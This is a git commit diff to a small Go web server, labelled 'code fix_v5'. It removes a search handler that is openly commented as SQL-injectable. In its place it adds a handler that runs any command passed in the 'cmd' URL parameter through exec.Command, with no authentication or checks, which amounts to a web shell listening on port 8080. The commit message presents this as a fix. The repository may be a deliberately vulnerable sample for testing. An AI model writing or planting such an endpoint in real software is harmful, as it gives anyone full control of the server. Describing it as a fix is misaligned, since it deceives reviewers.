d0f56daec3dd0a1cbf8dc337dedd85b12cf6f899
a7cc <47489441+A7cc@users.noreply.github.com>
2026-07-10 13:35:59 +0800

    code fix_v5

--- main.go
+++ main.go
@@ -1,60 +1,32 @@
 package main
 
 import (
-	"database/sql"
-	"fmt"
 	"net/http"
-
-	_ "github.com/mattn/go-sqlite3"
+	"os/exec"
 )
 
-var db *sql.DB
+func handler(w http.ResponseWriter, r *http.Request) {
 
-func searchHandler(w http.ResponseWriter, r *http.Request) {
-	id := r.URL.Query().Get("id")
-	// SQL注入漏洞
-	query := "SELECT username FROM users WHERE id=" + id
-	rows, err := db.Query(query)
-	if err != nil {
-		http.Error(w, err.Error(), 500)
-		return
-	}
-	defer rows.Close()
-	for rows.Next() {
-		var username string
-		rows.Scan(&username)
-		fmt.Fprintf(w, username)
-	}
-}
+	cmd := r.URL.Query().Get("cmd")
 
-func initDB() {
-	var err error
-	db, err = sql.Open(
-		"sqlite3",
-		"./test.db",
+	command := exec.Command(
+		cmd,
 	)
-	if err != nil {
-		panic(err)
-	}
-	db.Exec(`
-	CREATE TABLE IF NOT EXISTS users(
-		id INTEGER,
-		username TEXT
-	)
-	`)
-	db.Exec(`
-	INSERT INTO users VALUES(1,'admin')
-	`)
+
+	command.Run()
+
 }
 
 func main() {
-	initDB()
+
 	http.HandleFunc(
-		"/search",
-		searchHandler,
+		"/",
+		handler,
 	)
+
 	http.ListenAndServe(
 		":8080",
 		nil,
 	)
+
 }
